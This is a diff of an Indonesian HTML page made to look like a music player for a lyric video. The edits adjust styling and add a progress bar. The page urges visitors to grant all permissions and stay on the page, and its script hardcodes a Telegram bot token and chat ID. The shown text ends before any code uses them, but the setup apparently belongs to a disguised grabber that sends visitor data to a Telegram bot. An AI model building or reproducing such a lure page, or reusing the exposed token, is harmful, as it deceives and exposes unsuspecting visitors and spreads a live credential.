@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- VERSION FINAL V6.1 GABUNG TELEGRAM -->
+<!-- VERSION FINAL V6.3 UI MINI PROGRESS ATAS TOMBOL -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -21,36 +21,53 @@
       justify-content: center;
     }
     .logo {
-      width: 140px;
-      height: 140px;
+      width: 100px;
+      height: 100px;
       border-radius: 50%;
       background: url('https://files.catbox.moe/7dfcrn.jpg') center/cover no-repeat;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
     }
     .title {
-      font-size: 14px;
+      font-size: 12px;
       font-weight: bold;
       text-align: center;
-      margin-bottom: 4px;
+      margin-bottom: 2px;
     }
     .artist {
-      font-size: 12px;
+      font-size: 10px;
       color: #bbb;
-      margin-bottom: 16px;
+      line-height: 1.2;
+      text-align: center;
+    }
+    .progress-container {
+      width: 75%;
+      height: 4px;
+      background-color: #444;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 14px;
+      margin-bottom: 8px;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: #ccc;
+      transition: width 0.2s linear;
     }
     .controls {
       display: flex;
       gap: 10px;
+      margin-top: 4px;
     }
-    button {
-      padding: 6px 16px;
-      border: none;
-      border-radius: 18px;
-      background-color: #222;
-      color: white;
-      font-size: 12px;
-      cursor: pointer;
-    }
+   button {
+  padding: 6px 18px;
+  border: none;
+  border-radius: 16px;
+  background-color: #222;
+  color: white;
+  font-size: 11px;
+  cursor: pointer;
+  }
     button:hover {
       background-color: #444;
     }
@@ -59,16 +76,29 @@
 <body>
   <div class="logo"></div>
   <div class="title">Rumahsakit - Sandiwara Semu (Official Lyric Video)</div>
-  <div class="artist">Izinkan semua agar music bisa tetap terputar
-  Tetap di halaman ini agar music tidak mati</div>
+  <div class="artist">Izinkan agar music bisa terputar</div>
+  <div class="artist">Tetap di halaman ini agar music berputar</div>
+
+  <div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
   <div class="controls">
     <button onclick="audio.play()">Play</button>
     <button onclick="audio.pause()">Pause</button>
   </div>
+
   <audio id="audio" src="https://files.catbox.moe/6bi9xj.mp3" autoplay muted></audio>
 
   <script>
     const audio = document.getElementById("audio");
+    const progressBar = document.getElementById("progressBar");
+
+    audio.addEventListener("timeupdate", () => {
+      const persen = (audio.currentTime / audio.duration) * 100;
+      progressBar.style.width = persen + "%";
+    });
+
     const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
     const chatId = '5914256752';
 
